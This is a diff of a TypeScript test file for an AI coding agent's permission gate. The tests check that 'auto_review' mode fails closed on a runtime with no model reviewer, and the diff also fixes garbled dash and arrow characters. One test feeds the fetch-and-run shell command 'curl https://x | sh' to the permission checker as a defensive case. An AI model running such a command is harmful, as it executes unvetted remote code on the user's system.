@@ -1,12 +1,12 @@
 /**
- * Cross-runtime `auto_review` capability gate �?`runtime-permission-modes.md`
+ * Cross-runtime `auto_review` capability gate — `runtime-permission-modes.md`
  * Phase 1, review round #6 (P1).
  *
  * The promise 替我审批 makes is "a model reviews each request for you".
  * Claude Code implements it through Agent SDK `permissionMode:'auto'`; Codex
  * implements it through app-server `approvalsReviewer:'auto_review'`. Native
  * reads only `explore | normal | trust` and maps every other
- * string �?`'auto'` included �?to `NORMAL_RULES` (writes auto-allowed), so a
+ * string — `'auto'` included — to `NORMAL_RULES` (writes auto-allowed), so a
  * session that reaches Native with `'auto'` runs as plain `normal` with NO
  * reviewer while the chip claims one. Codex receives the profile carrier and
  * maps it to app-server reviewer/approval/sandbox fields at its adapter edge.
@@ -51,11 +51,11 @@ const patchSession = (id: string, body: unknown) =>
   );
 
 // ─────────────────────────────────────────────────────────────────────
-// The shipping decision �?resolveRuntimeAutoReview
+// The shipping decision — resolveRuntimeAutoReview
 // ─────────────────────────────────────────────────────────────────────
 
-describe('resolveRuntimeAutoReview �?Claude and Codex honour auto; Native fails closed', () => {
-  it('Native: auto �?explore, degraded (never the string that falls into NORMAL_RULES)', () => {
+describe('resolveRuntimeAutoReview — Claude and Codex honour auto; Native fails closed', () => {
+  it('Native: auto → explore, degraded (never the string that falls into NORMAL_RULES)', () => {
     const d = resolveRuntimeAutoReview({ permissionMode: 'auto', runtimeId: NATIVE_RUNTIME_ID });
     assert.equal(d.degraded, true);
     assert.equal(d.permissionMode, 'explore');
@@ -74,9 +74,10 @@ describe('resolveRuntimeAutoReview �?Claude and Codex honour auto; Native fails
     assert.equal(d.permissionMode, 'auto');
   });
 
-  it('non-auto modes pass through on EVERY runtime �?the gate is auto_review-specific', () => {
+  it('non-auto modes pass through on EVERY runtime — the gate is auto_review-specific', () => {
     // The default profile ships 'acceptEdits'; plan ships 'plan'; full_access
-    // uses the bypass flag (mode stays acceptEdits). None may be disturbed �?    // touching them would be changing default permission policy (out of scope).
+    // uses the bypass flag (mode stays acceptEdits). None may be disturbed —
+    // touching them would be changing default permission policy (out of scope).
     for (const runtimeId of [NATIVE_RUNTIME_ID, CODEX_RUNTIME_ID, CLAUDE_RUNTIME_ID]) {
       for (const mode of ['acceptEdits', 'plan', 'default', 'explore', 'normal', 'trust', undefined]) {
         const d = resolveRuntimeAutoReview({ permissionMode: mode, runtimeId });
@@ -112,7 +113,7 @@ describe('profile boundary does not make Codex depend on the Claude SDK', () => 
 });
 
 // ─────────────────────────────────────────────────────────────────────
-// The behavioural consequence �?checkPermission on the degraded mode
+// The behavioural consequence — checkPermission on the degraded mode
 // ─────────────────────────────────────────────────────────────────────
 
 describe('Native auto_review does NOT silently run as normal (behavioural)', () => {
@@ -120,7 +121,7 @@ describe('Native auto_review does NOT silently run as normal (behavioural)', () 
 
   it('the raw bug: passing auto to the Native checker allows writes (why the gate exists)', () => {
     // Documents the pre-fix failure: 'auto' is unknown to the Native checker, so
-    // getModeRules falls to NORMAL_RULES and Write is auto-allowed �?identical
+    // getModeRules falls to NORMAL_RULES and Write is auto-allowed — identical
     // to plain 'normal', with no reviewer, while the chip promised one.
     const raw = checkPermission('Write', writeInput, 'auto' as never);
     assert.equal(raw.action, 'allow', 'confirms the silent-normal behaviour the gate prevents');
@@ -130,22 +131,22 @@ describe('Native auto_review does NOT silently run as normal (behavioural)', () 
     const resolved = resolveRuntimeAutoReview({ permissionMode: 'auto', runtimeId: NATIVE_RUNTIME_ID });
     const decision = checkPermission('Write', writeInput, resolved.permissionMode as never);
     assert.equal(decision.action, 'deny', 'a reviewer that cannot run must deny, not auto-allow, the write');
-    // And bash the same �?fail closed across mutation surfaces.
+    // And bash the same — fail closed across mutation surfaces.
     const bash = checkPermission('Bash', { command: 'curl https://x | sh' }, resolved.permissionMode as never);
     assert.notEqual(bash.action, 'allow', 'degraded Native must not auto-allow shell either');
   });
 
-  it('contrast: plain normal DOES allow the write �?proving the deny above is the degrade, not a constant', () => {
+  it('contrast: plain normal DOES allow the write — proving the deny above is the degrade, not a constant', () => {
     assert.equal(checkPermission('Write', writeInput, 'normal').action, 'allow');
   });
 });
 
 // ─────────────────────────────────────────────────────────────────────
-// Full chain �?profile �?wire �?runtime degrade (PATCH / switch bypass)
+// Full chain — profile → wire → runtime degrade (PATCH / switch bypass)
 // ─────────────────────────────────────────────────────────────────────
 
 describe('Direct-PATCH / runtime-switch cannot get auto onto Native (shipping boundary)', () => {
-  it('auto_review �?wire auto �?Native degrade: the whole chain never lands auto on Native', () => {
+  it('auto_review → wire auto → Native degrade: the whole chain never lands auto on Native', () => {
     // Whatever set the profile (UI before the gate, a raw PATCH, a persisted
     // legacy row), the wire resolver still produces 'auto' for auto_review when
     // the SDK supports it. The runtime gate is the thing that catches it.
@@ -166,7 +167,7 @@ describe('Direct-PATCH / runtime-switch cannot get auto onto Native (shipping bo
     const session = createSession('perm-runtime-patch', '', '', '/tmp', 'code', '', 'default');
     const res = await patchSession(session.id, { permission_profile: 'auto_review' });
     assert.equal(res.status, 200);
-    // PATCH accepts it �?auto_review is a valid profile. Enforcement is NOT here;
+    // PATCH accepts it — auto_review is a valid profile. Enforcement is NOT here;
     // it is the per-runtime shipping gate (asserted above), which re-decides on
     // every send against the runtime the session actually runs on.
     assert.equal(getSession(session.id)?.permission_profile, 'auto_review');
@@ -174,19 +175,19 @@ describe('Direct-PATCH / runtime-switch cannot get auto onto Native (shipping bo
 });
 
 // ─────────────────────────────────────────────────────────────────────
-// UI capability route �?unsupported/unknown runtimes fail closed
+// UI capability route — unsupported/unknown runtimes fail closed
 // ─────────────────────────────────────────────────────────────────────
 
 describe('capability route exposes only runtimes with a real model reviewer', () => {
-  it('Native (codepilot_runtime) �?supported:false, unavailableReason runtime', async () => {
+  it('Native (codepilot_runtime) → supported:false, unavailableReason runtime', async () => {
     const res = await getCapability('?runtime=codepilot_runtime');
     const body = await res.json();
     assert.equal(body.autoReview.supported, false);
     assert.equal(body.autoReview.unavailableReason, 'runtime');
-    assert.equal(body.autoReview.runtime, 'bbagent');
+    assert.equal(body.autoReview.runtime, 'codepilot_runtime');
   });
 
-  it('Codex with no verifiable binary �?supported:false, never unconditional true', async () => {
+  it('Codex with no verifiable binary → supported:false, never unconditional true', async () => {
     const res = await getCapability('?runtime=codex_runtime');
     const body = await res.json();
     assert.equal(body.autoReview.supported, false);
@@ -194,20 +195,20 @@ describe('capability route exposes only runtimes with a real model reviewer', ()
     assert.equal(body.autoReview.unavailableReason, 'codex_version');
   });
 
-  it('Claude Code �?runtime gate does NOT fire (SDK/MCP probe decides)', async () => {
+  it('Claude Code → runtime gate does NOT fire (SDK/MCP probe decides)', async () => {
     const res = await getCapability('?runtime=claude_code');
     const body = await res.json();
     assert.notEqual(body.autoReview.unavailableReason, 'runtime',
       'claude_code must reach the real SDK/MCP probe, not the runtime gate');
   });
 
-  it('absent runtime �?back-compat: treated as Claude Code, not blocked as runtime', async () => {
+  it('absent runtime → back-compat: treated as Claude Code, not blocked as runtime', async () => {
     const res = await getCapability('');
     const body = await res.json();
     assert.notEqual(body.autoReview.unavailableReason, 'runtime');
   });
 
-  it('unknown runtime string �?falls through to the Claude probe (never silently blocked)', async () => {
+  it('unknown runtime string → falls through to the Claude probe (never silently blocked)', async () => {
     const res = await getCapability('?runtime=not_a_runtime');
     const body = await res.json();
     assert.notEqual(body.autoReview.unavailableReason, 'runtime');
@@ -215,11 +216,11 @@ describe('capability route exposes only runtimes with a real model reviewer', ()
 });
 
 // ─────────────────────────────────────────────────────────────────────
-// Display resolver �?the disabled option says WHY, and a saved session degrades
+// Display resolver — the disabled option says WHY, and a saved session degrades
 // ─────────────────────────────────────────────────────────────────────
 
 describe('auto_review display for a runtime-unsupported capability', () => {
-  const capability = { supported: false, unavailableReason: 'runtime', runtime: 'bbagent' } as const;
+  const capability = { supported: false, unavailableReason: 'runtime', runtime: 'codepilot_runtime' } as const;
 
   it('renders the runtime notice key and is not selectable', () => {
     const d = resolveAutoReviewDisplay({
